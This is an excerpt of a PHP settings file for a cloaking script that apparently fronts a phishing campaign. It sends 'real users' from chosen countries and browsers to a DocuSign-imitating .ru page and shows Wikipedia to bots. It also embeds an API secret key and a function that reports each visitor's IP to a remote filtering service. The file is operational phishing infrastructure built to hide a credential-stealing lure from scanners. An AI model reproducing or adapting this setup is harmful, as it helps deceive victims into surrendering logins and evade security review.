...
/* Required settings     */
$HCSET['OFFER_PAGE'] = 'https://docusignonline.e-sing-in.ru/?rxW=kIFfA';//PHP/HTML file or URL offer used for real users
$HCSET['WHITE_PAGE'] = 'https://www.wikipedia.org/';//PHP/HTML file or URL used for bots
...
$HCSET['FILTER_GEO_LIST'] = 'us,eu,gb,de,cy,cz,it,pt,fr,, fi , de gr gu, lt lu mt, lv, es se ca, pl ro , sk si, ie hr'; // string([2Chars country codes])
...
/* NETWORK FILTERS */
$HCSET['FILTER_BRO_MODE'] = 'reject'; // 'allow|reject'
$HCSET['FILTER_BRO_LIST'] = 'FF'; // string([Chrome|Safari|FF|Other]);
...
$HCSET['API_SECRET_KEY'] = 'v1a9b19efb1b664640afbd9e46c59f63aa';
/*********************************************/
...
function apiRequest($ip, $port, $HCSET, $HCSETdata)
{
    ...
    $url = 'http://'.$host.'/basic?ip=' . $ip . '&port=' . $port . '&key=' . $HCSET['API_SECRET_KEY'] . '&sign=v2-2143130291&js=false&stage='.$HCSET['stage'];
